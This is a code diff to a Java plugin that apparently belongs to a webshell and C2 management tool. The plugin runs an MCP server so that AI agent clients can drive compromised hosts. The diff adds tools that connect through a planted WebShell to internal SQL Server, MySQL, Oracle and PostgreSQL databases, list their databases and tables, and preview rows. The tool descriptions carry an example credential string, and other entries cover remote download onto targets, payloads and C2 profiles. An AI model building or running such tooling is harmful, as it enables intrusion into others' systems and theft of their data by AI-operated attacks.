@@ -14,7 +14,10 @@ import core.annotation.PayloadAnnotation;
 import core.annotation.PluginAnnotation;
 import core.imp.Payload;
 import core.imp.Plugin;
+import core.shell.GDatabaseResult;
 import core.shell.ShellEntity;
+import core.ui.config.DatabaseSql;
+import core.ui.component.ShellDatabasePanel;
 import core.ui.component.dialog.GOptionPane;
 import core.ui.component.model.DbInfo;
 import java.awt.BorderLayout;
@@ -67,9 +70,11 @@ public class McpService implements Plugin {
     private static String bindHost = DEFAULT_BIND;
     /** Bearer token required on /sse /message /health /config. Empty = reject non-loopback. */
     private static volatile String authToken = "";
-    private static final ConcurrentLinkedQueue<HttpExchange> sseClients = new ConcurrentLinkedQueue<>();
+    private static final java.util.concurrent.ConcurrentHashMap<String, HttpExchange> sseSessions = new java.util.concurrent.ConcurrentHashMap<>();
     private static final Yaml yaml = new Yaml();
     private static final java.util.concurrent.ConcurrentHashMap<String, ShellEntity> shellCache = new java.util.concurrent.ConcurrentHashMap<>();
+    /** Last DatabaseManage connection name used by MCP for this shell. */
+    private static final java.util.concurrent.ConcurrentHashMap<String, String> dbActiveConfig = new java.util.concurrent.ConcurrentHashMap<>();
 
 
     private JPanel panel;
@@ -86,8 +91,14 @@ public class McpService implements Plugin {
     private JButton writeCodexBtn;
 
     public McpService() {
-        panel = new JPanel(new BorderLayout(6, 6));
+        this(false);
+    }
+
+    /** {@code skipUi=true} for team MCP CLI: do not touch Swing widgets. */
+    public McpService(boolean skipUi) {
         ensureAuthToken();
+        if (skipUi) return;
+        panel = new JPanel(new BorderLayout(6, 6));
 
         // Row 1: bind + port + start/stop
         JPanel row1 = new JPanel();
@@ -205,7 +216,7 @@ public class McpService implements Plugin {
         }
         try {
             server = HttpServer.create(new InetSocketAddress(java.net.InetAddress.getByName(bindHost), port), 0);
-            server.setExecutor(Executors.newFixedThreadPool(4));
+            server.setExecutor(newMcpExecutor());
             server.createContext("/sse", new SseHandler());
             server.createContext("/message", new MessageHandler());
             server.createContext("/health", new HealthHandler());
@@ -677,6 +688,7 @@ public class McpService implements Plugin {
         server.stop(0);
         server = null;
         running = false;
+        sseSessions.clear();
         refreshUiState();
         log("[MCP] \u670d\u52a1\u5df2\u505c\u6b62");
     }
@@ -707,8 +719,8 @@ public class McpService implements Plugin {
         System.setProperty("java.awt.headless", "true"); // \u7981\u6b62 AWT \u5f39\u7a97\uff0c\u9632\u6b62 GOptionPane \u963b\u585e MCP
         try {
             server = HttpServer.create(new InetSocketAddress(java.net.InetAddress.getByName(bindHost), port), 0);
-            server.setExecutor(Executors.newFixedThreadPool(4));
-            McpService dummy = new McpService();
+            server.setExecutor(newMcpExecutor());
+            McpService dummy = new McpService(true);
             server.createContext("/sse", dummy.new SseHandler());
             server.createContext("/message", dummy.new MessageHandler());
             server.createContext("/health", dummy.new HealthHandler());
@@ -730,17 +742,8 @@ public class McpService implements Plugin {
             System.out.println();
             System.out.println("Authorization: Bearer " + authToken);
             System.out.println();
-
-            // Auto-write client configs
-            String claudeMsg = dummy.doWriteClaudeConfigs(true);
-            String codexMsg = dummy.doWriteCodexConfig(true);
-            System.out.println("Config written:");
-            for (String line : claudeMsg.split("\n")) {
-                if (line.startsWith("[OK]")) System.out.println("  " + line.substring(4).trim());
-            }
-            for (String line : codexMsg.split("\n")) {
-                if (line.startsWith("[OK]")) System.out.println("  " + line.substring(4).trim());
-            }
+            System.out.println("Team client mcp.json (copy to each workstation, do not write on this server):");
+            System.out.println(dummy.buildMcpJson(primary));
             System.out.println();
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 if (server != null) { server.stop(0); running = false; }
@@ -1041,6 +1044,50 @@ public class McpService implements Plugin {
         } catch (Exception ignored) {}
     }
 
+    private static java.util.concurrent.ExecutorService newMcpExecutor() {
+        return Executors.newCachedThreadPool(r -> {
+            Thread t = new Thread(r, "gsl5-mcp");
+            t.setDaemon(true);
+            return t;
+        });
+    }
+
+    private static String queryParam(HttpExchange ex, String key) {
+        try {
+            String q = ex.getRequestURI() != null ? ex.getRequestURI().getRawQuery() : null;
+            if (q == null) return null;
+            for (String part : q.split("&")) {
+                int eq = part.indexOf('=');
+                if (eq > 0 && key.equalsIgnoreCase(part.substring(0, eq))) {
+                    return java.net.URLDecoder.decode(part.substring(eq + 1), "UTF-8");
+                }
+            }
+        } catch (Exception ignored) {}
+        return null;
+    }
+
+    private static void writeSse(HttpExchange sse, String payload) throws IOException {
+        synchronized (sse) {
+            OutputStream os = sse.getResponseBody();
+            os.write(payload.getBytes(StandardCharsets.UTF_8));
+            os.flush();
+        }
+    }
+
+    private static void pushSse(String sessionId, String json) {
+        HttpExchange sse = sessionId != null ? sseSessions.get(sessionId) : null;
+        if (sse == null && (sessionId == null || sessionId.isEmpty()) && sseSessions.size() == 1) {
+            sse = sseSessions.values().iterator().next();
+        }
+        if (sse == null) return;
+        try {
+            writeSse(sse, "event: message\ndata: " + json + "\n\n");
+        } catch (Exception e) {
+            if (sessionId != null) sseSessions.remove(sessionId, sse);
+            else sseSessions.values().remove(sse);
+        }
+    }
+
     // ==================== SSE ====================
     class SseHandler implements HttpHandler {
         public void handle(HttpExchange ex) throws IOException {
@@ -1057,17 +1104,21 @@ public class McpService implements Plugin {
             ex.getResponseHeaders().set("Connection", "keep-alive");
             ex.getResponseHeaders().set("Access-Control-Allow-Origin", "*");
             ex.sendResponseHeaders(200, 0);
-            sseClients.add(ex);
-            // Use request Host so LAN clients get NIC IP endpoint, not hardcoded 127.0.0.1
-            String endpoint = "http://" + resolveRequestHost(ex) + ":" + port + "/message";
+            String sessionId = UUID.randomUUID().toString();
+            sseSessions.put(sessionId, ex);
+            String endpoint = "http://" + resolveRequestHost(ex) + ":" + port + "/message?sessionId=" + sessionId;
             try {
-                OutputStream os = ex.getResponseBody();
-                os.write(("event: endpoint\ndata: " + endpoint + "\n\n").getBytes(StandardCharsets.UTF_8));
-                os.flush();
+                writeSse(ex, "event: endpoint\ndata: " + endpoint + "\n\n");
             } catch (Exception ignored) {}
-            while (running) {
-                try { Thread.sleep(15000); ex.getResponseBody().write(": ping\n\n".getBytes(StandardCharsets.UTF_8)); ex.getResponseBody().flush(); }
-                catch (Exception e) { sseClients.remove(ex); break; }
+            try {
+                while (running) {
+                    Thread.sleep(15000);
+                    writeSse(ex, ": ping\n\n");
+                }
+            } catch (Exception e) {
+                // client gone
+            } finally {
+                sseSessions.remove(sessionId, ex);
             }
         }
     }
@@ -1092,11 +1143,7 @@ public class McpService implements Plugin {
                 Object id = req.get("id");
                 Object params = req.get("params");
                 String result = dispatch(method, params, id);
-                // Push through SSE and also return as HTTP response
-                for (HttpExchange sse : sseClients) {
-                    try { sse.getResponseBody().write(("event: message\ndata: " + result + "\n\n").getBytes(StandardCharsets.UTF_8)); sse.getResponseBody().flush(); }
-                    catch (Exception ign) { sseClients.remove(sse); }
-                }
+                pushSse(queryParam(ex, "sessionId"), result);
                 sendJson(ex, 202, result);
             } catch (Exception e) {
                 sendJson(ex, 200, j("jsonrpc","2.0","id",null,"error",m("code",-32603,"message",e.getMessage())));
@@ -1370,10 +1417,15 @@ public class McpService implements Plugin {
         sb.append(",").append(t("file_attr","\u8bbe\u7f6e\u6587\u4ef6\u5c5e\u6027/\u65f6\u95f4", p("shellId",s("\u5fc5\u586b"),"path",s("\u5fc5\u586b"),"type",s("fileBasicAttr \u6216 fileTimeAttr"),"attr",s("\u5c5e\u6027\u503c"))));
         sb.append(",").append(t("file_remote_down","\u8fdc\u7a0b\u4e0b\u8f7d\u5230\u76ee\u6807", p("shellId",s("\u5fc5\u586b"),"url",s("\u5fc5\u586b"),"savePath",s("\u5fc5\u586b"))));
         sb.append(",").append(t("file_roots","\u5217\u51fa\u6587\u4ef6\u7cfb\u7edf\u6839\u76ee\u5f55", p("shellId",s("\u5fc5\u586b"))));
-        // DB (3)
-        sb.append(",").append(t("db_exec","\u6267\u884c SQL\u3002\u652f\u6301configName\u76f4\u63a5\u7528\u5df2\u4fdd\u5b58\u914d\u7f6e(\u7701\u7565host/user/pass)", p("shellId",s("\u5fc5\u586b"),"configName",s("\u9009\u586b,\u7528db_configs(list)\u67e5,\u586b\u4e86\u53ef\u7701\u7565\u4ee5\u4e0b\u8fde\u63a5\u53c2\u6570"),"dbType",s("mysql/oracle/sqlserver/postgresql/sqlite"),"dbHost",s(""),"dbPort",s(""),"dbName",s(""),"dbUser",s(""),"dbPass",s(""),"sql",s("\u5fc5\u586b"),"execType",s("select\u6216update"))));
-        sb.append(",").append(t("db_list_types","\u5217\u51fa\u652f\u6301\u7684\u6570\u636e\u5e93\u7c7b\u578b", p("shellId",s("\u5fc5\u586b"))));
-        sb.append(",").append(t("db_configs","\u7ba1\u7406\u6570\u636e\u5e93\u914d\u7f6e", p("shellId",s("\u5fc5\u586b"),"action",s("list/add/get/update/delete"),"configName",s(""),"dbInfo",s("YAML\u683c\u5f0f"))));
+        // DB = \u754c\u9762\u300c\u6570\u636e\u5e93\u300d\u6807\u7b7e(\u8fde Shell \u540e\u7528\u5df2\u4fdd\u5b58\u7684 DatabaseConfig)
+        sb.append(",").append(t("db_connect","\u7ecf WebShell \u8fde\u5185\u7f51\u5e93(\u754c\u9762\u300c\u6570\u636e\u5e93\u300d). \u7528\u6237\u8bf4\u300c\u8fde\u63a5 127.0.0.1 1433 sa 123456 sqlserver\u300d\u65f6: target\u586b\u8fd9\u4e00\u4e32, \u6216\u5206\u5f00\u4f20 host/port/user/pass/type", p("shellId",s("\u5fc5\u586b"),"target",s("\u4f8b: 127.0.0.1 1433 sa 123456 sqlserver"),"dbHost",s("\u4f8b 127.0.0.1"),"dbPort",s("\u4f8b 1433"),"dbUser",s("\u4f8b sa"),"dbPass",s(""),"dbType",s("sqlserver/mysql/oracle/postgresql/sqlite"),"dbName",s("\u53ef\u9009,\u9ed8\u8ba4 master/mysql/postgres"),"configName",s("\u53ef\u9009,\u4fdd\u5b58\u540d"))));
+        sb.append(",").append(t("db_exec","\u8d70\u754c\u9762\u6570\u636e\u5e93\u9762\u677f\u7684 execSql\u3002\u5148 db_connect \u6216\u76f4\u63a5\u7528\u5df2\u4fdd\u5b58\u8fde\u63a5", p("shellId",s("\u5fc5\u586b"),"sql",s("\u5fc5\u586b"),"configName",s("\u53ef\u9009"),"dbName",s("\u5f53\u524d\u5e93,\u53ef\u9009"),"execType",s("select/update,\u53ef\u7701\u7565"))));
+        sb.append(",").append(t("db_databases","\u5217\u5e93(\u540c\u754c\u9762\u5de6\u4fa7\u6811\u5237\u65b0)", p("shellId",s("\u5fc5\u586b"),"configName",s("\u53ef\u9009"))));
+        sb.append(",").append(t("db_tables","\u5217\u8868", p("shellId",s("\u5fc5\u586b"),"database",s("\u5fc5\u586b,\u5e93\u540d"),"configName",s("\u53ef\u9009"))));
+        sb.append(",").append(t("db_preview","\u9884\u89c8\u8868(\u524d10\u884c)", p("shellId",s("\u5fc5\u586b"),"table",s("\u5fc5\u586b"),"database",s("\u5e93\u540d"),"configName",s("\u53ef\u9009"))));
+        sb.append(",").append(t("db_count","\u8868\u884c\u6570", p("shellId",s("\u5fc5\u586b"),"table",s("\u5fc5\u586b"),"database",s("\u5e93\u540d"),"configName",s("\u53ef\u9009"))));
+        sb.append(",").append(t("db_list_types","\u5f53\u524d Payload \u652f\u6301\u7684\u5e93\u7c7b\u578b", p("shellId",s("\u5fc5\u586b"))));
+        sb.append(",").append(t("db_configs","\u67e5\u770b/\u7ba1\u7406\u754c\u9762\u5df2\u4fdd\u5b58\u7684\u6570\u636e\u5e93\u8fde\u63a5", p("shellId",s("\u5fc5\u586b"),"action",s("list/add/get/update/delete"),"configName",s(""),"dbType",s(""),"dbHost",s(""),"dbPort",s(""),"dbName",s(""),"dbUser",s(""),"dbPass",s(""),"dbCharset",s(""),"dbInfo",s("\u53ef\u9009 YAML"))));
         // Payloads (1)
         sb.append(",").append(t("payload_list","\u5217\u51fa\u6240\u6709 Payload \u53ca\u53ef\u7528\u52a0\u5bc6\u5668(Cryption)\u3002\u975eC2\u52a0\u5bc6\u5668\u76f4\u63a5\u7528\u4e8eshell_create;C2\u52a0\u5bc6\u5668(\u540d\u542bC2)\u8fd8\u9700c2profile_list\u67e5\u6a21\u677f", p()));
         // C2 Profile (2)
@@ -1449,7 +1501,12 @@ public class McpService implements Plugin {
                 case "file_attr":    text = fileAttr(a); break;
                 case "file_remote_down": text = fileRemoteDown(a); break;
                 case "file_roots":   text = fileRoots(a); break;
+                case "db_connect":   text = dbConnect(a); break;
                 case "db_exec":      text = dbExec(a); break;
+                case "db_databases": text = dbDatabases(a); break;
+                case "db_tables":    text = dbTables(a); break;
+                case "db_preview":   text = dbPreview(a); break;
+                case "db_count":     text = dbCount(a); break;
                 case "db_list_types": text = dbListTypes(a); break;
                 case "db_configs":   text = dbConfigs(a); break;
                 case "payload_list": text = payloadList(); break;
@@ -2284,57 +2341,565 @@ public class McpService implements Plugin {
     }
 
 
-    // --- Database ---
+    // --- Database: Shell \u5df2\u4fdd\u5b58\u8fde\u63a5 + \u539f\u7248 ShellDatabasePanel.execSql ---
+    private String dbConnect(Map<String, Object> a) {
+        try {
+            ShellEntity sh = getShellInit(a);
+            mergeDbConnectArgs(a);
+            DbInfo dbInfo = resolveDbInfo(sh, a);
+            if (dbInfo == null) {
+                return "\u7f3a\u5c11\u8fde\u63a5\u53c2\u6570\u3002\u4f8b: target=127.0.0.1 1433 sa 123456 sqlserver\n" + dbNeedConfigHint(sh);
+            }
+            if (isBlank(dbInfo.getHost()) || isBlank(dbInfo.getDatabaseType())) {
+                return "\u7f3a\u5c11 host \u6216\u5e93\u7c7b\u578b\u3002\u4f8b: 127.0.0.1 1433 sa 123456 sqlserver";
+            }
+            ensureDbDefaults(dbInfo);
+            ensureDbDrive(sh, dbInfo);
+            persistDbInfo(sh, dbInfo);
+            rememberDbConfig(sh, dbInfo);
+            String type = dbInfo.getDatabaseType();
+            String tpl = DatabaseSql.sqlMap.get(type.toLowerCase() + "-getAllDatabase");
+            if (tpl == null) {
+                return "\u5df2\u5199\u5165\u8fde\u63a5 " + nvl(dbInfo.getConfigName()) + " \u4f46\u65e0\u5217\u5e93\u6a21\u677f: " + type;
+            }
+            Object result = execViaDatabasePanel(sh, dbInfo, "select", tpl);
+            return "\u5df2\u7ecf WebShell \u8fde\u5e93: " + nvl(dbInfo.getConfigName())
+                    + "\t" + type + "\t" + nvl(dbInfo.getHost()) + ":" + dbInfo.getPort()
+                    + "\tuser=" + nvl(dbInfo.getUsername())
+                    + "\tdb=" + nvl(dbInfo.getCurrentDatabase())
+                    + "\n" + formatDbResult(result);
+        } catch (Exception ex) {
+            return "\u8fde\u63a5\u5931\u8d25: " + (ex.getMessage() != null ? ex.getMessage() : ex.toString());
+        }
+    }
+
     private String dbExec(Map<String, Object> a) {
-        ShellEntity sh = getShellInit(a);
-        Payload pl = sh.getPayloadModule();
-        DbInfo dbInfo = null;
-        // Support configName to use saved db config directly
-        String configName = (String) a.get("configName");
-        if (configName != null && !configName.isEmpty()) {
-            dbInfo = sh.getDbInfo(configName);
-            if (dbInfo == null) return "\u672a\u627e\u5230\u6570\u636e\u5e93\u914d\u7f6e: " + configName + "\uff0c\u7528 db_configs(action=list) \u67e5\u770b\u5df2\u4fdd\u5b58\u914d\u7f6e";
+        String sql = strArg(a.get("sql"));
+        if (isBlank(sql)) return "\u7f3a\u5c11 sql";
+        try {
+            ShellEntity sh = getShellInit(a);
+            DbInfo dbInfo = resolveDbInfo(sh, a);
+            if (dbInfo == null) return dbNeedConfigHint(sh);
+            rememberDbConfig(sh, dbInfo);
+            String execType = inferExecType(sql, strArg(a.get("execType")));
+            return formatDbResult(execViaDatabasePanel(sh, dbInfo, execType, sql));
+        } catch (Exception ex) {
+            return "SQL \u5931\u8d25: " + (ex.getMessage() != null ? ex.getMessage() : ex.toString());
         }
-        if (dbInfo == null) {
-            dbInfo = new DbInfo();
-            dbInfo.setDatabaseType((String) a.get("dbType"));
-            dbInfo.setHost((String) a.get("dbHost"));
-            dbInfo.setPort(toInt(a.get("dbPort"), 3306));
-            dbInfo.setCurrentDatabase((String) a.get("dbName"));
-            dbInfo.setUsername((String) a.get("dbUser"));
-            dbInfo.setPassword((String) a.get("dbPass"));
+    }
+
+    private String dbDatabases(Map<String, Object> a) {
+        return dbRunTemplate(a, "getAllDatabase", null, null);
+    }
+
+    private String dbTables(Map<String, Object> a) {
+        String database = firstNonBlank(strArg(a.get("database")), strArg(a.get("dbName")));
+        if (isBlank(database)) return "\u7f3a\u5c11 database(\u5e93\u540d)";
+        if (isBlank(a.get("dbName"))) a.put("dbName", database);
+        return dbRunTemplate(a, "getTableByDatabase", database, null);
+    }
+
+    private String dbPreview(Map<String, Object> a) {
+        String table = strArg(a.get("table"));
+        if (isBlank(table)) return "\u7f3a\u5c11 table";
+        String database = firstNonBlank(strArg(a.get("database")), strArg(a.get("dbName")));
+        if (!isBlank(database) && isBlank(a.get("dbName"))) a.put("dbName", database);
+        return dbRunTemplate(a, "getTableDataByDT", database, table);
+    }
+
+    private String dbCount(Map<String, Object> a) {
+        String table = strArg(a.get("table"));
+        if (isBlank(table)) return "\u7f3a\u5c11 table";
+        String database = firstNonBlank(strArg(a.get("database")), strArg(a.get("dbName")));
+        if (!isBlank(database) && isBlank(a.get("dbName"))) a.put("dbName", database);
+        return dbRunTemplate(a, "getCountByDT", database, table);
+    }
+
+    private String dbRunTemplate(Map<String, Object> a, String suffix, String database, String table) {
+        try {
+            ShellEntity sh = getShellInit(a);
+            DbInfo dbInfo = resolveDbInfo(sh, a);
+            if (dbInfo == null) return dbNeedConfigHint(sh);
+            if (!isBlank(database)) {
+                dbInfo.setCurrentDatabase(database);
+            }
+            String type = dbInfo.getDatabaseType();
+            if (isBlank(type)) return "\u7f3a\u5c11 dbType";
+            String tpl = DatabaseSql.sqlMap.get(type.toLowerCase() + "-" + suffix);
+            if (tpl == null) return "\u4e0d\u652f\u6301\u7684\u6a21\u677f: " + type + "-" + suffix;
+            String dbName = firstNonBlank(database, dbInfo.getCurrentDatabase(), "");
+            String sql = tpl.replace("{databaseName}", dbName).replace("{tableName}", table == null ? "" : table);
+            rememberDbConfig(sh, dbInfo);
+            return formatDbResult(execViaDatabasePanel(sh, dbInfo, "select", sql));
+        } catch (Exception ex) {
+            return "\u67e5\u8be2\u5931\u8d25: " + (ex.getMessage() != null ? ex.getMessage() : ex.toString());
         }
-        String execType = (String) a.getOrDefault("execType", "select");
-        Object result = pl.execSql(dbInfo, execType, (String) a.get("sql"));
-        return result != null ? result.toString() : "null";
     }
 
     private String dbListTypes(Map<String, Object> a) {
         ShellEntity sh = getShellInit(a);
-        Payload pl = sh.getPayloadModule();
-        String[] types = pl.getSupportDatabaseTypes();
-        
-        return String.join(", ", types);
+        String[] types = sh.getPayloadModule().getSupportDatabaseTypes();
+        return types == null || types.length == 0 ? "\u65e0\u652f\u6301\u7684\u6570\u636e\u5e93\u7c7b\u578b" : String.join(", ", types);
     }
 
     @SuppressWarnings("unchecked")
     private String dbConfigs(Map<String, Object> a) {
         ShellEntity sh = getShell(a);
-        String action = (String) a.getOrDefault("action", "list");
+        String action = String.valueOf(a.getOrDefault("action", "list"));
         switch (action) {
-            case "list": { String[] configs = sh.listDatabaseConfigs(); return configs.length>0 ? String.join("\n", configs) : "\u65e0\u6570\u636e\u5e93\u914d\u7f6e"; }
-            case "get": { DbInfo info = sh.getDbInfo((String) a.get("configName")); return info != null ? new Yaml().dump(info) : "\u672a\u627e\u5230"; }
-            case "add": case "update": {
-                Object dbInfoObj = a.get("dbInfo");
-                DbInfo info;
-                if (dbInfoObj instanceof Map) info = new Yaml().loadAs(new Yaml().dump(dbInfoObj), DbInfo.class);
-                else info = new Yaml().loadAs((String) dbInfoObj, DbInfo.class);
-                boolean ok = action.equals("add") ? sh.addDbIfo(info) : sh.updateDbIfo(info);
-                return ok ? "\u6210\u529f" : "\u5931\u8d25";
+            case "list": {
+                String[] configs = sh.listDatabaseConfigs();
+                if (configs == null || configs.length == 0) return "\u65e0\u6570\u636e\u5e93\u914d\u7f6e";
+                StringBuilder sb = new StringBuilder();
+                for (String name : configs) {
+                    DbInfo info = sh.getDbInfo(name);
+                    sb.append(name);
+                    if (info != null) {
+                        sb.append("\t").append(nvl(info.getDatabaseType()))
+                                .append("\t").append(nvl(info.getHost())).append(":").append(info.getPort())
+                                .append("\t").append(nvl(info.getCurrentDatabase()))
+                                .append("\t").append(nvl(info.getUsername()));
+                    }
+                    sb.append("\n");
+                }
+                return sb.toString();
             }
-            case "delete": return sh.deleteDbInfo((String) a.get("configName")) ? "\u5220\u9664\u6210\u529f" : "\u5220\u9664\u5931\u8d25";
-            default: return "\u672a\u77e5\u64cd\u4f5c: " + action;
+            case "get": {
+                DbInfo info = sh.getDbInfo(strArg(a.get("configName")));
+                return info != null ? formatDbInfo(info) : "\u672a\u627e\u5230";
+            }
+            case "add":
+            case "update": {
+                DbInfo info = dbInfoFromArgs(a);
+                if (info == null) return "\u7f3a\u5c11\u914d\u7f6e: \u4f20 dbInfo YAML \u6216 configName+dbType+dbHost \u7b49\u5e73\u94fa\u5b57\u6bb5";
+                if (isBlank(info.getConfigName())) return "\u7f3a\u5c11 configName";
+                boolean ok = "add".equals(action) ? sh.addDbIfo(info) : sh.updateDbIfo(info);
+                return ok ? "\u6210\u529f: " + info.getConfigName() : ("add".equals(action) ? "\u5931\u8d25(\u53ef\u80fd\u5df2\u5b58\u5728)" : "\u5931\u8d25");
+            }
+            case "delete":
+                return sh.deleteDbInfo(strArg(a.get("configName"))) ? "\u5220\u9664\u6210\u529f" : "\u5220\u9664\u5931\u8d25";
+            default:
+                return "\u672a\u77e5\u64cd\u4f5c: " + action + " (\u652f\u6301 list/add/get/update/delete)";
         }
+    }
+
+    /** Prefer GUI-saved DatabaseConfig_*; same store as the Database tab. */
+    private DbInfo resolveSavedDbInfo(ShellEntity sh, String configName) {
+        if (!isBlank(configName)) {
+            DbInfo named = sh.getDbInfo(configName);
+            if (named == null) {
+                throw new RuntimeException("\u672a\u627e\u5230\u6570\u636e\u5e93\u8fde\u63a5: " + configName + "\uff0c\u7528 db_configs action=list \u67e5");
+            }
+            return named;
+        }
+        String last = dbActiveConfig.get(sh.getId());
+        if (!isBlank(last)) {
+            DbInfo remembered = sh.getDbInfo(last);
+            if (remembered != null) {
+                return remembered;
+            }
+        }
+        String[] configs = sh.listDatabaseConfigs();
+        if (configs != null && configs.length > 0) {
+            return sh.getDbInfo(configs[0]);
+        }
+        return null;
+    }
+
+    private DbInfo resolveDbInfo(ShellEntity sh, Map<String, Object> a) {
+        mergeDbConnectArgs(a);
+        boolean hasInline = !isBlank(a.get("dbHost")) || !isBlank(a.get("dbType"))
+                || !isBlank(a.get("dbUser")) || !isBlank(a.get("target"));
+        DbInfo dbInfo = null;
+        if (!isBlank(a.get("configName")) || !hasInline) {
+            try {
+                dbInfo = resolveSavedDbInfo(sh, strArg(a.get("configName")));
+            } catch (RuntimeException ex) {
+                if (!hasInline) {
+                    throw ex;
+                }
+            }
+        }
+        if (dbInfo == null) {
+            if (!hasInline) {
+                return null;
+            }
+            dbInfo = new DbInfo();
+        }
+        applyDbArgs(dbInfo, a);
+        ensureDbDefaults(dbInfo);
+        return dbInfo;
+    }
+
+    /** Accept "127.0.0.1 1433 sa 123456 sqlserver" plus host/port/user/pass aliases. */
+    private void mergeDbConnectArgs(Map<String, Object> a) {
+        aliasIfAbsent(a, "host", "dbHost");
+        aliasIfAbsent(a, "ip", "dbHost");
+        aliasIfAbsent(a, "port", "dbPort");
+        aliasIfAbsent(a, "user", "dbUser");
+        aliasIfAbsent(a, "username", "dbUser");
+        aliasIfAbsent(a, "password", "dbPass");
+        aliasIfAbsent(a, "pass", "dbPass");
+        aliasIfAbsent(a, "type", "dbType");
+        aliasIfAbsent(a, "database", "dbName");
+        String target = firstNonBlank(strArg(a.get("target")), strArg(a.get("connect")));
+        if (isBlank(target)) {
+            return;
+        }
+        Map<String, Object> parsed = parseDbTarget(target);
+        for (Map.Entry<String, Object> e : parsed.entrySet()) {
+            if (isBlank(a.get(e.getKey()))) {
+                a.put(e.getKey(), e.getValue());
+            }
+        }
+    }
+
+    private static void aliasIfAbsent(Map<String, Object> a, String from, String to) {
+        if (isBlank(a.get(to)) && !isBlank(a.get(from))) {
+            a.put(to, a.get(from));
+        }
+    }
+
+    private Map<String, Object> parseDbTarget(String target) {
+        Map<String, Object> m = new java.util.LinkedHashMap<>();
+        if (isBlank(target)) {
+            return m;
+        }
+        java.util.ArrayList<String> tokens = new java.util.ArrayList<>();
+        for (String raw : target.trim().replace(',', ' ').split("\\s+")) {
+            if (raw.isEmpty()) {
+                continue;
+            }
+            int colon = raw.lastIndexOf(':');
+            if (colon > 0 && colon < raw.length() - 1 && raw.substring(colon + 1).matches("\\d{1,5}")) {
+                tokens.add(raw.substring(0, colon));
+                tokens.add(raw.substring(colon + 1));
+            } else {
+                tokens.add(raw);
+            }
+        }
+        java.util.ArrayList<String> leftover = new java.util.ArrayList<>();
+        for (String tok : tokens) {
+            String type = normalizeDbType(tok);
+            if (type != null && isBlank(m.get("dbType"))) {
+                m.put("dbType", type);
+            } else if (tok.matches("\\d{1,5}") && isBlank(m.get("dbPort"))) {
+                int p = toInt(tok, 0);
+                if (p > 0 && p <= 65535) {
+                    m.put("dbPort", tok);
+                } else {
+                    leftover.add(tok);
+                }
+            } else if (isDbHostToken(tok) && isBlank(m.get("dbHost"))) {
+                m.put("dbHost", tok);
+            } else {
+                leftover.add(tok);
+            }
+        }
+        if (isBlank(m.get("dbHost")) && !leftover.isEmpty()) {
+            m.put("dbHost", leftover.remove(0));
+        }
+        if (!leftover.isEmpty() && isBlank(m.get("dbUser"))) {
+            m.put("dbUser", leftover.remove(0));
+        }
+        if (!leftover.isEmpty() && isBlank(m.get("dbPass"))) {
+            m.put("dbPass", leftover.remove(0));
+        }
+        if (!leftover.isEmpty() && isBlank(m.get("dbName"))) {
+            m.put("dbName", leftover.remove(0));
+        }
+        return m;
+    }
+
+    private static String normalizeDbType(String tok) {
+        if (tok == null) {
+            return null;
+        }
+        String t = tok.toLowerCase();
+        if ("mssql".equals(t) || "mssqlserver".equals(t) || "sqlserver".equals(t)) {
+            return "sqlserver";
+        }
+        if ("postgres".equals(t) || "pgsql".equals(t) || "postgresql".equals(t)) {
+            return "postgresql";
+        }
+        if ("mysql".equals(t) || "oracle".equals(t) || "sqlite".equals(t)) {
+            return t;
+        }
+        return null;
+    }
+
+    private static boolean isDbHostToken(String tok) {
+        if (tok == null || tok.isEmpty()) {
+            return false;
+        }
+        String t = tok.toLowerCase();
+        if ("localhost".equals(t) || "127.0.0.1".equals(t) || "::1".equals(t)) {
+            return true;
+        }
+        if (t.matches("\\d{1,3}(\\.\\d{1,3}){3}")) {
+            return true;
+        }
+        return t.indexOf('.') > 0 && t.matches("[A-Za-z0-9._\\-]+");
+    }
+
+    private void ensureDbDefaults(DbInfo dbInfo) {
+        if (dbInfo == null) {
+            return;
+        }
+        if (isBlank(dbInfo.getDatabaseType()) && dbInfo.getPort() > 0) {
+            switch (dbInfo.getPort()) {
+                case 1433: dbInfo.setDatabaseType("sqlserver"); break;
+                case 3306: dbInfo.setDatabaseType("mysql"); break;
+                case 1521: dbInfo.setDatabaseType("oracle"); break;
+                case 5432: dbInfo.setDatabaseType("postgresql"); break;
+                default: break;
+            }
+        }
+        if (dbInfo.getPort() <= 0) {
+            dbInfo.setPort(defaultDbPort(dbInfo.getDatabaseType()));
+        }
+        if (isBlank(dbInfo.getCurrentDatabase())) {
+            String type = nvl(dbInfo.getDatabaseType()).toLowerCase();
+            if ("sqlserver".equals(type)) {
+                dbInfo.setCurrentDatabase("master");
+            } else if ("mysql".equals(type)) {
+                dbInfo.setCurrentDatabase("mysql");
+            } else if ("postgresql".equals(type)) {
+                dbInfo.setCurrentDatabase("postgres");
+            }
+        }
+        if (isBlank(dbInfo.getConfigName())) {
+            String auto = nvl(dbInfo.getDatabaseType()) + "-" + nvl(dbInfo.getHost()) + "-" + dbInfo.getPort();
+            dbInfo.setConfigName(auto.replaceAll("[^A-Za-z0-9._-]", "_"));
+        }
+        String cs = null;
+        try {
+            cs = dbInfo.getDatabaseCharset();
+        } catch (Throwable ignored) {
+        }
+        if (isBlank(cs)) {
+            dbInfo.setDatabaseCharset("UTF-8");
+        }
+    }
+
+    private void persistDbInfo(ShellEntity sh, DbInfo dbInfo) {
+        if (sh == null || dbInfo == null || isBlank(dbInfo.getConfigName())) {
+            return;
+        }
+        if (!sh.addDbIfo(dbInfo)) {
+            sh.updateDbIfo(dbInfo);
+        }
+    }
+
+    private void rememberDbConfig(ShellEntity sh, DbInfo dbInfo) {
+        if (sh != null && dbInfo != null && !isBlank(dbInfo.getConfigName())) {
+            dbActiveConfig.put(sh.getId(), dbInfo.getConfigName());
+        }
+    }
+
+    /**
+     * Same path as the Database tab: live ShellDatabasePanel.execSql when the
+     * shell window is open; otherwise Payload.execSql with the saved DbInfo.
+     */
+    private void ensureDbDrive(ShellEntity sh, DbInfo dbInfo) {
+        if (dbInfo == null || !isBlank(dbInfo.getDatabaseDrive())) {
+            return;
+        }
+        String type = dbInfo.getDatabaseType();
+        if (isBlank(type) || sh == null || sh.getPayloadModule() == null) {
+            return;
+        }
+        try {
+            String[] drives = sh.getPayloadModule().getDatabaseDrives(type);
+            if (drives != null && drives.length > 0 && !isBlank(drives[0])) {
+                dbInfo.setDatabaseDrive(drives[0]);
+            }
+        } catch (Throwable ignored) {
+        }
+    }
+
+    private Object execViaDatabasePanel(ShellEntity sh, DbInfo dbInfo, String execType, String sql) throws Exception {
+        if (dbInfo == null) {
